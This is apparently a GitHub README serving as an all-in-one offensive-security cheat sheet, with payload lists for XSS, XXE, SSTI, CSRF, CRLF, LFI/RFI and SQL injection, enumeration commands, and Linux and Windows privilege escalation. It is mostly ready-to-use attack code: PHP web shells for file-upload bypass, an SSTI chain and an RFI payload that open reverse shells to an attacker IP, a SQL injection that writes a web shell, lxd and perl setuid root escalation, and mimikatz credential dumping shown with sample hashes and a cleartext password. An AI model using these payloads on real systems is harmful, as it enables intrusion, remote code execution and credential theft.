
# Adding new topics daily
<img alt="GIF" src="https://media1.giphy.com/media/Rm1p7xp3Odl2o/giphy.gif?raw=true" width="500" height="320" />


# I need some time to make it useful :)

### Contents:
  - [Categories](#contents)
      - [Bug Bounty 🤖](#bugbounty)
      - [Linux 👨🏽‍💻](#linux)
      - [Windows 🪟](#windows)
      - [Linux privesc 🐧](#linux-privesc)
      - [Windows privesc 😃](#windows-privesc)
      - [Extra notes 🗒](#extra-notes)



### BugBounty
  - [Basic enumeration](#basic-enumeration)
     - [find subdomains](#find-subdomains)
  - [Bypass file upload filtering](#bypass-file-upload-filtering)
  - [Open redirect](#open-web-redirect)
  - [PHP filter](#php-filters-for-lfi)
  - [Cross Side Scripting (XSS)](#xss-common-payloads)
  - [XML External Entity (XXE)](#xxe-common-payloads)
  - [Server Side Template Injection (SSTI)](#server-side-template-injection-ssti)
  - [Sever Side Request Forgery (SSRF)](#ssrf-common-payloads)
  - [Client Side Request Forgerty (CSRF)](#csrf-common-payloads)
  - [Carriage Return and Line Feed (CRLF)](#crlf-common-payloads)
  - [Local File Inclution (LFI)](#local-file-inclusion-lfi-payloads)
  - [Remote File Inclution (RFI)](#remote-file-inclusion-rfi)
  - [Structured Query Language Injection (SQLI)](#sql-injection-payload-list)

### Linux
 - [Basic enumeration](#basic-enumeration-on-linux-and-windows)
 - [Useful find commands](#useful-find-commands-example)
 - [Simple bash port scanner](#simple-bash-port-scanner)
 - [Python virtual environment](#python-virtual-environment)
 - [File permission](https://github.com/akr3ch/CS-AIO-CheatSheet/edit/main/README.md#scecific-permission-for-specific-user)
 - [SMB enumeration](#smb-enumeration)
### Windows
- [Basic enumeration](#basic-enumeration-on-linux-and-windows)
- [SMB enumeration](#windows-smb-enumeration)
- [xfreerdp](#xfreerdp)

### Linux Privesc
  - [LXC/LXD container](#lxclxd-privilege-escalation)
  - [Perl setuid capability](#perl-setuid-capability-privesc)

### Windows privesc
 - [metasploit](#metasploit)
    - [mimikatz_kiwi](#mimikatz-kiwi)
 - [mimikatz](#mimikatz)
 - [impacket](#impacket)
    - [psexec](#psexec)
    - [smbexec](#smbexec)
    - [wmiexec](#wmiexec)
    - [dcomexec](#)
    - [crackmapexec](#crackmapexec)
    - [smbclient](#smbclient)
  - [evil-winrm](#evil-winrm)


### Extra notes
  - [make NTML hash from password](#make-ntml-hash-from-password)
  - [snap](#snap)
-------------------------------------------------------------------------------------------------------------
# Basic Enumeration

### Find Subdomains

#### `wfuzz`

```
sudo wfuzz -c -f sub-fighter.txt -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200,202,204,301,302,307,403 <targetURL>
```

Now you may get a ton of output that shows valid subdomains depending on how the site is configured. If you notice a large amount of results that contain the same word count, this may just be an indication that the site returns a 200 response, but it just displays a “Not found” error.

`To remove results with a specific word count, you can append your command w/ --hw <value>. For example, our new command that removes results that respond a word count of 290 would look like the following:`

```
wfuzz -c -f sub-fighter -w top5000.txt -u 'http://target.tld' -H "Host: FUZZ.target.tld" --hw 290
```

### `sublist3r`
 
with sublist3r it is simple as
  
```
sublist3r -d <domian name>
```
 
 
### `gobuster`
  
`dns`
```
gobuster dns -d erev0s.com -w awesome_wordlist.txt -i
```
 `vhost`
```
gobuster vhost -u erev0s.com -w awesome_wordlist.txt -v
```

-----------------------------------------------------------------------------------------------------------------
# Bypass File Upload Filtering

`GIF89a`
```php
GIF89a;
<?
system($_GET['cmd']);
?>
```

`exiftool`

```php
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg

mv evil.jpg evil.php.jpg
```
-------------------------------------------------------------------------------------------------------------
# Open web redirect

### Open web redirect common payloads
```
/%09/example.com
/%2f%2fexample.com
/%2f%2f%2fbing.com%2f%3fwww.omise.co
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%5cexample.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
/.example.com
//%09/example.com
//%5cexample.com
///%09/example.com
///%5cexample.com
////%09/example.com
////%5cexample.com
/////example.com
/////example.com/
////\;@example.com
////example.com/
////example.com/%2e%2e
////example.com/%2e%2e%2f
////example.com/%2f%2e%2e
////example.com/%2f..
////example.com//
///\;@example.com
///example.com
///example.com/
//google.com/%2f..
//www.whitelisteddomain.tld@google.com/%2f..
///google.com/%2f..
///www.whitelisteddomain.tld@google.com/%2f..
////google.com/%2f..
////www.whitelisteddomain.tld@google.com/%2f..
https://google.com/%2f..
https://www.whitelisteddomain.tld@google.com/%2f..
/https://google.com/%2f..
/https://www.whitelisteddomain.tld@google.com/%2f..
//www.google.com/%2f%2e%2e
//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
///www.google.com/%2f%2e%2e
///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
////www.google.com/%2f%2e%2e
////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
```
#### [source](https://github.com/payloadbox/open-redirect-payload-list)
-------------------------------------------------------------------------------------------------------------

# XSS common payloads
```xml
<img src=x>
<script>alert('XSS')</script>
"><script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
<d3"<"/onclick="1>[confirm``]"<">z
<d3/onmouseenter=[2].find(confirm)>z
<details open ontoggle=confirm()>
<script y="><">/*<script* */prompt()</script
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
<a href="javascript%26colon;alert(1)">click
<a href=javas&#99;ript:alert(1)>click
<script/"<a"/src=data:=".<a,[8].some(confirm)>
<svg/x=">"/onload=confirm()//
<--`<img/src=` onerror=confirm``> --!>
<svg%0Aonload=%09((pro\u006dpt))()//
<sCript x>(((confirm)))``</scRipt x>
<svg </onload ="1> (_=prompt,_(1)) "">
<!--><script src=//14.rs>
<embed src=//14.rs>
<script x=">" src=//15.rs></script>
<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
<iframe/src \/\/onload = prompt(1)
<x oncut=alert()>x
<svg onload=write()>
```

--------------------------------------------------------------------------------------------------------------
# XXE common payloads
### XXE: read local files
  `linux`
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

  `windows`
 ```xml
  <?xml version = "1.0"?>
  <!DOCTYPE replace [<!ENTITY exploit SYSTEM "file:///windows/win.ini"> ]>
<order>
  <quantity>1</quantity>
  <item>
&exploit;
</item>
  <address>USA</address>
  </order>
 ```
If the output of the `win.ini` file on the target returns the response message, then it proves that the XML External Entity vulnerability is present.

### use replace funtion if case sensitive
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY exploit SYSTEM "file:///etc/passwd"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&exploit;</lastName>
</userInfo>
```
### XXE to SSRF
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```
### XXE inside SVG
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://id"></image>
</svg>
```

#### [source](https://github.com/payloadbox/xxe-injection-payload-list)
--------------------------------------------------------------------------------------------------------------
# Server Side Template Injection (SSTI)

#### [1] Try this, everywhere the app is taking input from the user and reflecting the output.

```python
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```
#### [2] if the app reflects the output as `49`.Then there might be a RCE possible.
#### [3] now encode the payload in basse64.

`input`
```shell
echo 'bash -i >& /dev/tcp/LHOST/4444 0>&1' | base64
```
`output`
```
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=
```
#### [4] now start a listener
```
nc -lvvp 4444
```

#### [5] resend the request with this command
```python
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA4LzQ0NDQgMD4mMQo=${IFS}|base64${IFS}-d|bash').read()}}
```

#### [6] if everything works currectly. You should get a reverse shell.
```shell
nc -vv -lnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.130.
Ncat: Connection from 10.10.11.130:54434.
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

#### [+] or we can try those above commands also, if the previous one doesn't works.

```python
{{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
```
```python
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}
```
--------------------------------------------------------------------------------
# SSRF common payloads
```http
http://127.0.0.1:80
```
```http
http://127.0.0.1:443
```
```http
http://127.0.0.1:22
```
```http
http://0.0.0.0:80
```
```http
http://0.0.0.0:443
```
```http
http://0.0.0.0:22
```
--------------------------------------------------------------------------------

# CSRF common payloads

### On click submit - HTML GET
```html
<a href="http://www.example.com/api/setusername?username=CSRF">Click Me</a>
```
### Auto submit - HTML GET
```html
<img src="http://www.example.com/api/setusername?username=CSRF">
```
### On click submit - HTML POST

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRF" />
 <input type="submit" value="Submit Request" />
</form>
```
### Auto submit - HTML POST
```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```
### JSON GET
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```
### JSON POST
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```
#### [source](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
--------------------------------------------------------------------------------
# CRLF common payloads

### Add a cookie
`request`
```http
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
```
`response`
```http
Connection: keep-alive
Content-Length: 178
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Location: https://www.example.net/[INJECTION STARTS HERE]
Set-Cookie: mycookie=myvalue
X-Frame-Options: SAMEORIGIN
X-Sucuri-ID: 15016
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
```
### XSS bypass
```http
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```
### HTML
```http
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```
### UTF-8 encoded payload
```http
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
```
--------------------------------------------------------------------------------

# Remote File Inclusion (RFI)

#### Common payloads
`php:expect://id`

`php:expect://whoami`

Remote file inclusion uses pretty much the same vector as local file inclusion.

A remote file inclusion vulnerability lets the attacker execute a script on the target-machine even though it is not even hosted on that machine.

RFI's are less common than LFI. Because in order to get them to work the developer must have edited the php.ini configuration file.

This is how they work.

So you have an unsanitized parameter, like this
```
$incfile = $_REQUEST["file"];
include($incfile.".php");
```
Now what you can do is to include a file that is not hosted on the victim-server, but instead on the attackers server.
```
http://exampe.com/index.php?page=http://attackerserver.com/evil.txt
```
And evil.txt will look like something like this:
```
<?php echo shell_exec("whoami");?>
```
`Or just get a reverse shell directly like this:`
```
<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
```
So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have a RCE.
Avoid extentions

Remember to add the nullbyte %00 to avoid appending .php. This will only work on php before version 5.3.

If it does not work you can also add a ?, this way the rest will be interpreted as url parameters.



-------------------------------------------------------------------------------------------------------------
# Local file inclusion (LFI) payloads

`../../../../../../etc/passwd`

`....//....//....//....//....//etc/passwd`

You can also try to use those insted of `/etc/passwd`
```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/var/log/apache2/access.log
```

# LFI examples

*akech.com/index.php?token=`/etc/passwd%00`*

*akrech.com/index.php?page=`../../../../../../etc/passwd`*

```
http://www.test.com.ar/main.php?pagina=data:text/plain,<?system($_GET['x']);?>&x=ls
```
```
http://www.test.com.ar/main.php?pagina=data:,<?system($_GET['x']);?>&x=ls
```
```
http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
```
-------------------------------------------------------------------------------------------------------------
# PHP filters for LFI

```
php://filter/convert.base64-encode/resource=
```

```
php://filter/read=string.rot13/resource=
```

*example input:*

example.com/index.php?page=`php://filter/read=string.rot13/resource=`index.php

example.com/index.php?page=`php://filter/convert.base64-encode/resource=`index.php

*example output:*

```
PD9waHAKJGRiX25hbWU9ImJpaHRhcHViX2RiIjsKaWYoJF9TRVJWRVJbIlNFUlZFUl9BRERSIl09PSIxMjcuMC4wLjEiKQoJJGNvbj1teXNxbF9jb25uZWN0KCJsb2NhbGhvc3QiLCJyb290IiwiIik7CmVsc2UKCSRjb249bXlzcWxfY29ubmVjdCgibG9jYWxob3N0IiwiYmlodGFwdWJfYWRtaW4iLCJCUFNAMjAxMyIpOwppZighJGNvbikKCXsKCWRpZSgiRXJyb3IgaW4gY29ubmVjdGlvbiIubXlzcWxfZXJyb3IoKSk7Cgl9Cm15c3FsX3NlbGVjdF9kYigiJGRiX25hbWUiKW9yIGRpZSgiY2Fubm90IHNlbGVjdCBEQiIpOwo/
```

*decode*
```php
<?php
$db_name="bihtapub_db";
if($_SERVER["SERVER_ADDR"]=="127.0.0.1")
   $con=mysql_connect("localhost","root","");
else
   $con=mysql_connect("localhost","bihtapub_admin","BPS@2013");
if(!$con)...
.
.
?>

```

-------------------------------------------------------------------------------------------------------
# SQL injection payload list
`Generic SQL Injection Payloads`
```sql
'
''
' or "
-- or # 
' OR '1
' OR 1 -- -
'or 1=1 -- -
" OR "" = "
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
```
------------------------------------------------------------------------------------------------------
## MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `mysql -u root -h examle.com -P 3306 -p` | login to mysql database |
| `SHOW DATABASES` | List available databases |
| `USE users` | Switch to database |
| **Tables** |
| `CREATE TABLE logins (id INT, ...)` | Add a new table |
| `SHOW TABLES` | List available tables in current database |
| `DESCRIBE logins` | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)` | Add values to table |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | Update table values |
| **Columns** |
| `SELECT * FROM table_name` | Show all columns in a table |
| `SELECT column1, column2 FROM table_name` | Show specific columns in a table |
| `DROP TABLE logins` | Delete a table |
| `ALTER TABLE logins ADD newColumn INT` | Add new column |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Change column datatype |
| `ALTER TABLE logins DROP oldColumn` | Delete column |
| **Output** |
| `SELECT * FROM logins ORDER BY column_1` | Sort by column |
| `SELECT * FROM logins ORDER BY column_1 DESC` | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two-columns |
| `SELECT * FROM logins LIMIT 2` | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2` | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>` | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | List results where the name is similar to a given string |

## MySQL Operator Precedence
* Division (`/`), Multiplication (`*`), and Modulus (`%`)
* Addition (`+`) and Subtraction (`-`)
* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection
| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass** |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
| **Union Injection** |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

# Windows
----------------------------------------------------------------------------------------------------------
## Basic enumeration on linux and windows
| **Linux**  | **Windows** | **Purpose of command** |
|------------|-------------|------------------------|
|`whoami`|`whoami`|Name of current user
| `uname -a`|`ver`|Operating system
|`ifconfig`|`ipconfig /all`|Network configuration
|`netstat -an`|`netstat -an`|Network connections
|`ps -ef`|`tasklist`|Running processes


## Windows SMB enumeration
* nmap - SMB Vulnerabilities on Windows
```
nmap -p 445 --script smb-vuln-ms06-025 target-IP
nmap -p 445 --script smb-vuln-ms07-029 target-IP
nmap -p 445 --script smb-vuln-ms08-067 target-IP
nmap -p 445 --script smb-vuln-ms10-054 target-IP
nmap -p 445 --script smb-vuln-ms10-061 target-IP
nmap -p 445 --script smb-vuln-ms17-010 target-IP
```

## xfreerdp
* login with the user hash
```
xfreerdp /u:user /d:domain /pth:011AD41795657A8ED80AB3FF6F078D03 /v:10.5.23.42
```

* login with the user password
```
xfreerdp /u:user /d:domain /p:password /v:10.5.23.42
```
-----------------------------------------------------------------------------------------------------------
# Useful find commands example

`find SUID files`
```
find / -user root -perm /4000 2>/dev/null
```
```
find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid
```
```
find / -type f -name '*.txt' 2>/dev/null
```
```
find / -perm -u=s -type f 2>/dev/null
```
```
getcap -r / 2>/dev/null
```

`find and read all hidden flag.txt `
```
cat $(find / -name flag.txt 2>/dev/null)
```
# Simple bash port scanner

```shell
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/127.0.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```
 
 # Python virtual environment
-------------------------------------------------------------------------------------------------
`install`
```
 sudo apt install python3.9-venv
```
`active` 
```
python3 -m venv env
```
```
┌──(kali㉿bughunt3r)-[~]
└─$ source env/bin/activate
                                                                                                                                                             
┌──(env)─(kali㉿bughunt3r)-[~]
└─$ 
```
 * notice that there is a variable added before the username & hostname.
 * now we are inside of the Python virtual environment.
-------------------------------------------------------------------------------------------------
# Specific permission for specific user
`no permission`
```
setfacl -m u:username:000 myfolder/myfile
```
`read-write-execute`
```
setfacl -m u:username:rwx myfolder/myfile
```
`readonly permission`
```
setfacl -m u:username:r myfolder/myfile
```
`read & write permission`
```
setfacl -m u:username:rw myfolder/myfile
```

--------------------------------------------------------------------------------------------------
# SMB enumeration
## smbclient usage
List shares on a machine using NULL Session
```
smbclient -L
```
List shares on a machine using a valid username + password
```
smbclient -L <target-IP> -U username%password
```
Connect to a valid share with username + password
```
smbclient //<target>/<share$> -U username%password
```
List files on a specific share
```
smbclient //<target>/<share$> -c 'ls' password -U username
```
List files on a specific share folder inside the share
```
smbclient //<target>/<share$> -c 'cd folder; ls' password -U username
```
Download a file from a specific share folder
```
smbclient //<target>/<share$> -c 'cd folder;get desired_file_name' password -U username
```
Copy a file to a specific share folder
```
smbclient //<target>/<share$> -c 'put /var/www/my_local_file.txt .\target_folder\target_file.txt' password -U username
```
Create a folder in a specific share folder
```
smbclient //<target>/<share$> -c 'mkdir .\target_folder\new_folder' password -U username
```
Rename a file in a specific share folder
```
smbclient //<target>/<share$> -c 'rename current_file.txt new_file.txt' password -U username
```

## enum4linux usage for smb enumeration
enum4linux - General enumeration - anonymous session
```
enum4linux -a <target>
```
enum4linux - General enumeration - authenticated session
```
enum4linux -a <target> -u <user> -p <pass>
```
enum4linux - Users enumeration
```
enum4linux -u <user> -p <pass> -U <target>
```
enum4linux - Group and members enumeration
```
enum4linux -u <user> -p <pass> -G <target>
```
enum4linux - Password policy
```
enum4linux -u <user> -p <pass> -P <target>
```
## Using nmap for smb enumeration
nmap - Enum Users
```
nmap -p 445 --script smb-enum-users <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-users <target> --script-args smbuser=username,smbhash=LM:NTLM,smbdomain=domain
```
```
nmap --script smb-enum-users.nse --script-args smbusername=User1,smbpass=Pass@1234,smbdomain=workstation -p445 192.168.1.10
```
```
nmap --script smb-enum-users.nse --script-args smbusername=User1,smbhash=aad3b435b51404eeaad3b435b51404ee:C318D62C8B3CA508DD753DDA8CC74028,smbdomain=mydomain -p445 192.168.1.10
```
nmap - Enum Groups
```
nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=username,smbhash=LM:NTLM,smbdomain=domain
```
nmap - Enum Shares
```
nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=username,smbpass=LM:NTLM,smbdomain=domain
```
nmap - OS Discovery
```
nmap -p 445 --script smb-os-discovery <target>
```
nmap - SMB Vulnerabilities on Windows
```
nmap -p 445 --script smb-vuln-ms06-025 target-IP
nmap -p 445 --script smb-vuln-ms07-029 target-IP
nmap -p 445 --script smb-vuln-ms08-067 target-IP
nmap -p 445 --script smb-vuln-ms10-054 target-IP
nmap -p 445 --script smb-vuln-ms10-061 target-IP
nmap -p 445 --script smb-vuln-ms17-010 target-IP
```
Always check for updated list on https://nmap.org/nsedoc/scripts/
map - Brute Force Accounts (be aware of account lockout!)
```
nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt target-IP
```

-------------------------------------------------------------------------------------------------------
# lxc/lxd Privilege Escalation

```shell
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```
*upload the `apline-v3.10-x86_64-someting-.tar.gz` file from the attacker machine*
```shell
python -m SimpleHTTPServer
```

*download the `apline-v3.10-x86_64-someting.tar.gz` file to victim machine*
```shell
cd /tmp
wget http://attacker-machine-ip:8000/apline-v3.10-x86_64-someting.tar.gz
```

*import the lxc image*
```shell
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
```

*check the lxc image*
```
lxc image list
```

*run these commands on target machine*
```shell
lxc init
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

# Perl setuid capability privesc

* if the `perl` has the `cap_setuid+ep` permission set.
* then it means `perl` has capability of changing `UID`.
```shell
akrech@akr3ch:/tmp$ getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
* create a perl file
```perl
akrech@akr3ch:/tmp$ cat root.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/bash";
```
```
akrech@akr3ch:/tmp$ ./root.pl
root@akr3ch:/tmp# id
uid=0(root) gid=1000(akrech) groups=1000(akrech)
```

# Windows privesc

## metasploit

### mimikatz kiwi

After obtaining a meterpreter shell, we need to ensure that our session is running with SYSTEM level privileges for Mimikatz to function properly.
```
meterpreter > getuid
Server username: WINXP-E95CE571A1\Administrator

meterpreter > getsystem
...got system (via technique 1).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Mimikatz supports 32bit and 64bit Windows architectures. After upgrading our privileges to SYSTEM, we need to verify, with the sysinfo command, what the architecture of the compromised machine is. This will be relevant on 64bit machines as we may have compromised a 32bit process on a 64bit architecture. If this is the case, meterpreter will attempt to load a 32bit version of Mimikatz into memory, which will cause most features to be non-functional. This can be avoided by looking at the list of running processes and migrating to a 64bit process before loading Mimikatz.
```
meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```  
Since this is a 64bit machine, we can proceed to load the Mimikatz module into memory.
```
meterpreter > load mimikatz
[!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
[!] The "kiwi" extension has already been loaded.
meterpreter > help kiwi

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```
* now we can simply use those above commands to privesc our target machine
* here are some examples
`cheds_all`
```
meterpreter > creds_all 
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain    NTLM                              SHA1
--------       ------    ----                              ----
Administrator  haris-PC  cdf51b162460b7d5bc898f493751a0cc  dff1521f5f2d7436a632d26f079021e9541aba66

wdigest credentials
===================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  haris-PC   ejfnIWWDojfWEKM
HARIS-PC$      WORKGROUP  (null)

kerberos credentials
====================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  haris-PC   (null)
haris-pc$      WORKGROUP  (null)
```
`cheds_msv`
```
meterpreter > creds_msv
[+] Running as SYSTEM                                                                                                                                        
[*] Retrieving msv credentials                                                                                                                               
msv credentials                                                                                                                                              
===============                                                                                                                                              
                                                                                                                                                             
Username       Domain    NTLM                              SHA1                                                                                              
--------       ------    ----                              ----                                                                                              
Administrator  haris-PC  cdf51b162460b7d5bc898f493751a0cc  dff1521f5f2d7436a632d26f079021e9541aba66
```

`password_change`
```
meterpreter > password_change -p ejfnIWWDojfWEKM -P akrech404 -u Administrator
